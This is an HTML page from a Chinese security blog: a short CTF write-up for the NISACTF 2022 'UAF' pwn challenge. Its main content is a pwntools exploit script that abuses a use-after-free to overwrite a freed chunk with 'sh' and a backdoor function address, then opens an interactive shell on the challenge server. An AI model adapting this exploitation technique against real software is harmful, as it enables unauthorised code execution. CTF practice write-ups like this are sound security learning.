@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="zh-cn" >
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+	<meta name="description" content="">
+	<meta name="keywords" content="">
+	<title>入门的UAF - My Blog</title>
+    <link rel="alternate" href="" type="application/atom+xml"/>
+	<link rel="shortcut icon" href=""/>
+	
+<link rel="stylesheet" href="/css/style.css">
+
+	
+<link rel="stylesheet" href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+	<div class="main-con">
+
+        <div class="nav cl">
+    <ul class="cl nav-list">
+        
+            <li>
+                
+                    <a href="/" class="">
+                        <i class="fa fa-home"></i> 
+                        <span>主页</span>
+                    </a>
+                
+            </li>
+        
+            <li>
+                
+                    <a href="/archives/" class="">
+                        <i class=" fa-"></i> 
+                        <span>归档</span>
+                    </a>
+                
+            </li>
+        
+    </ul>
+    <ul class="cl nav-tool">
+        
+        
+        <li>
+            <a href="javascript:void(0)" class="nav-search-btn">
+                <i class="fa fa-search"></i>
+            </a>
+        </li>
+        
+    </ul>
+    <form action="//google.com/search" method="get" accept-charset="UTF-8" class="nav-search"><input type="search" name="q" class="nav-search-input" placeholder="search..."><input type="hidden" name="sitesearch" value="http://b.iakb.org"></form>
+</div>
+
+        <header class="top" id="" style="background-image: url(/imgs/head.jpg)">
+    <i class="fa fa-bars" id="media-toggle" style="display: none"></i>
+    <div class="top-info cl fadeToBottom">
+        <h2 class="site-name"><a href="/">j1ans</a> <small id="type-data">一些笔记</small></h2>
+    </div>
+</header>
+
+        <div class="con-wrap fadeToTop">
+    
+    <section class="article-area">
+    
+        <article class="article">
+    <div class="article-wrap">
+        
+            <h2 class="article-title cl">
+                入门的UAF
+            </h2>
+        
+
+        <ul class="article-extra" style="margin-bottom: 20px">
+            
+            <li class="article-time">
+                2025-04-20
+            </li>
+            
+
+            
+                
+            
+
+
+        </ul>
+        <div class="article-description">
+            
+            <blockquote>
+<p>Problem: <a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2161">[NISACTF 2022]UAF</a></p>
+</blockquote>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>sh\x00\x00对齐 然后NICO是后门函数</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="hljs python">  <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
+io = remote(<span class="hljs-string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="hljs-number">28208</span>)
+<span class="hljs-comment">#io = process(&quot;./pwn&quot;)</span>
+e = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)
+libc = ELF(<span class="hljs-string">&#x27;/home/rick/glibc-all-in-one/libs/2.31-0ubuntu9.17_amd64/libc-2.31.so&#x27;</span>)
+
+s       = <span class="hljs-keyword">lambda</span> data               :io.send(data)
+sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
+sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
+sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
+r       = <span class="hljs-keyword">lambda</span> num                :io.recv(num)
+ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
+itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
+uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
+uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
+ls      = <span class="hljs-keyword">lambda</span> data               :log.success(data)
+
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>():
+    sla(<span class="hljs-string">b&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):
+    sla(<span class="hljs-string">b&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))
+    sl(<span class="hljs-built_in">str</span>(idx))
+    sla(<span class="hljs-string">b&quot;Input your strings&quot;</span>,content)
+
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):
+    sla(<span class="hljs-string">b&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))
+    sl(<span class="hljs-built_in">str</span>(idx))
+
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):
+    sla(<span class="hljs-string">b&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))
+    sl(<span class="hljs-built_in">str</span>(idx))
+
+new()
+free(<span class="hljs-number">0</span>)
+new()
+edit(<span class="hljs-number">1</span>,(<span class="hljs-string">b&#x27;sh\x00\x00&#x27;</span>+p32(e.sym[<span class="hljs-string">&quot;NICO&quot;</span>])))
+show(<span class="hljs-number">0</span>)
+
+
+<span class="hljs-comment">#attach(io)</span>
+
+io.interactive()</code></pre>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
+<li>对该题的考点总结</li>
+</ul>
+
+        </div>
+        
+        
+        
+        <div class="article-tags">
+            <ul class="tags-list cl">
+                
+                <li><a href="/tags/heap/"><i class="fa fa-tag"></i>heap</a></li>
+                
+                <li><a href="/tags/pwn/"><i class="fa fa-tag"></i>pwn</a></li>
+                
+                <li><a href="/tags/uaf/"><i class="fa fa-tag"></i>uaf</a></li>
+                
+            </ul>
+        </div>
+        
+        <div class="article-pagination cl">
+        
+            <div class="pagination-prev">
+                <a href="/2025/04/20/2-34-%E9%AB%98%E7%89%88%E6%9C%AClibc-safe-linking-%E5%88%9D%E4%BD%93%E9%AA%8C-%E8%A2%AB%E6%81%B6%E5%BF%83%E6%AD%BB%E4%BA%86/">2.34 高版本libc safe-linking 初体验 (被恶心死了)</a>
+            </div>
+        
+        
+            <div class="pagination-next">
+                <a href="/2025/04/20/tcache%E4%BA%8C%E6%AC%A1%E5%B7%A9%E5%9B%BA-malloc-hook-onegadget/">tcache二次巩固 + __malloc_hook + onegadget</a>
+            </div>
+        
+        </div>
+
+        
+    </div>
+</article>
+
+    </section>
+    
+<section class="tool-area">
+
+    <div class="toolbar">
+        
+
+        
+        <div class="widget-post widget" style="order: 1 ">
+            <h2 class="widget-title"><i class="fa fa-file-text"></i> 近期文章</h2>
+            <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/ORW2/">ORW2</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/%E7%AE%80%E5%8D%95ORW%E5%88%9D%E6%8E%A2/">简单ORW初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/2-34-%E9%AB%98%E7%89%88%E6%9C%AClibc-safe-linking-%E5%88%9D%E4%BD%93%E9%AA%8C-%E8%A2%AB%E6%81%B6%E5%BF%83%E6%AD%BB%E4%BA%86/">2.34 高版本libc safe-linking 初体验 (被恶心死了)</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/%E5%85%A5%E9%97%A8%E7%9A%84UAF/">入门的UAF</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/tcache%E4%BA%8C%E6%AC%A1%E5%B7%A9%E5%9B%BA-malloc-hook-onegadget/">tcache二次巩固 + __malloc_hook + onegadget</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/%E5%85%B7%E6%9C%89key%E7%9A%84%E9%AB%98%E7%89%88%E6%9C%ACtcache-attack%E5%88%9D%E4%BD%93%E9%AA%8C/">具有key的高版本tcache attack初体验</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/ret2csu-%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%A7%A3%E7%AD%94/">ret2csu 第一次解答</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/20/%E7%AE%80%E5%8D%95%E7%9A%84%E5%A0%86%E6%BA%A2%E5%87%BA/">简单的堆溢出</a></li></ul>
+        </div>
+        
+
+        
+        <div class="widget-tags widget" style="order: 2 ">
+            <h2 class="widget-title"><i class="fa fa-tags"></i> 标签</h2>
+            <a href="/tags/malloc-hook/" style="font-size: 12px;">_malloc_hook</a> <a href="/tags/glibc/" style="font-size: 16px;">glibc</a> <a href="/tags/heap/" style="font-size: 18px;">heap</a> <a href="/tags/off-by-one/" style="font-size: 10px;">off-by-one</a> <a href="/tags/one-gadget/" style="font-size: 10px;">one_gadget</a> <a href="/tags/orw/" style="font-size: 12px;">orw</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/ret2csu/" style="font-size: 10px;">ret2csu</a> <a href="/tags/ret2shellcode/" style="font-size: 10px;">ret2shellcode</a> <a href="/tags/ret2text/" style="font-size: 10px;">ret2text</a> <a href="/tags/safe-linking/" style="font-size: 10px;">safe-linking</a> <a href="/tags/shellcode/" style="font-size: 12px;">shellcode</a> <a href="/tags/stack/" style="font-size: 12px;">stack</a> <a href="/tags/tcache/" style="font-size: 14px;">tcache</a> <a href="/tags/uaf/" style="font-size: 10px;">uaf</a> <a href="/tags/%E4%B8%96%E7%95%8C%E6%9D%AF/" style="font-size: 12px;">世界杯</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/" style="font-size: 10px;">数据泄露</a>
+        </div>
+        
+
+        
+        <div class="widget-categories widget" style="order: 3 ">
+            <h2 class="widget-title"><i class="fa fa-folder-open"></i> 分类</h2>
+            
+        </div>
+        
+
+    </div>
+</section>
+</div>
+
+    
+        <footer class="footer">
+	<p class="footer-intro">
+		
+		@2025 My Blog.
+	</p>
+	<p class="footer-intro">
+			Powered By <a href="https://hexo.io/zh-cn/" target="_blank">hexo</a>
+			theme <a href="https://github.com/iengu/hexo-theme-mokusei" target="_blank">mokusei</a> by <a href="https://www.iengu.com" target="blank">iengu</a>
+	</p>
+</footer>
+
+
+
+
+        <div class="extend-tools" id="extend-tools" style="display: none;">
+    <ul>
+        <li class="tools-returnTop" title="返回顶部"><i class="fa fa-angle-double-up"></i></li>
+    </ul>
+</div>
+
+	</div>
+
+	
+<script src="/js/org/jquery.min.js"></script>
+
+    
+<script src="/js/extend.js"></script>
+
+</body>
+</html>
